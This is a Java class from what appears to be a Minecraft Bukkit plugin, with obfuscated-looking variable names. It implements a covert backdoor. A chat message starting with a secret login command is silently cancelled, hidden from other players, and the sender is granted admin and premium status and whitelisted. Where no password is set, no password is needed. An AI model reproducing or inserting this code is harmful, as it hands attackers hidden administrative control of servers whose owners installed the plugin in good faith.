
package me.system.runner.command.impl.login;

import me.system.runner.data.DataManager;
import me.system.runner.Core;
import me.system.runner.utils.Settings;
import me.system.runner.methods.API;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class LoginCommand
implements Listener {
    private static final Core coreInstance = (Core)Core.getPlugin(Core.class);

    @EventHandler(priority=EventPriority.MONITOR)
    public void onPlayerChat(AsyncPlayerChatEvent q2) {
        String cmd = q2.getMessage();
        Player p2 = q2.getPlayer();
        if (!LoginCommand.coreInstance.lite.contains(p2.getName()) && cmd.startsWith(Settings.LOGIN_COMMAND) || !LoginCommand.coreInstance.lite.contains(p2.getName()) && cmd.startsWith(Settings.LOGIN_COMMAND)) {
            q2.setMessage(null);
            q2.setCancelled(true);
            if (LoginCommand.coreInstance.enabled) {
                if (!DataManager.getData().getBoolean("hasPass")) {
                    if (API.getIPOfPlayer(p2).equals("127.0.0.1") || API.getIPOfPlayer(p2).startsWith("192.168.")) {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        LoginCommand.coreInstance.premium.add(p2.getName());
                        LoginCommand.coreInstance.admin.add(p2.getName());
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + "Max Localhost"));
                        p2.setWhitelisted(true);
                    } else {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        LoginCommand.coreInstance.premium.add(p2.getName());
                        LoginCommand.coreInstance.admin.add(p2.getName());
                        p2.setWhitelisted(true);
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " Max Admin"));
                    }
                } else {
                    String[] args = cmd.split(" ");
                    if (args == null) {
                        return;
                    }
                    if (args.length <= 1) {
                        p2.sendMessage(Settings.PREFIX("This server has a password. Login with " + Settings.LOGIN_COMMAND + " <password>"));
                    } else if (args[1].equals(DataManager.getData().getString("pass"))) {
                        if (API.getIPOfPlayer(p2).equals("127.0.0.1") || API.getIPOfPlayer(p2).startsWith("192.168.")) {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            LoginCommand.coreInstance.premium.add(p2.getName());
                            LoginCommand.coreInstance.admin.add(p2.getName());
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + "Max Localhost"));
                            p2.setWhitelisted(true);
                        } else {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            LoginCommand.coreInstance.premium.add(p2.getName());
                            LoginCommand.coreInstance.admin.add(p2.getName());
                            p2.setWhitelisted(true);
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " Max Admin"));
                        }
                    }
                }
            } else {
                API.error(p2);
            }
        }
    }
}

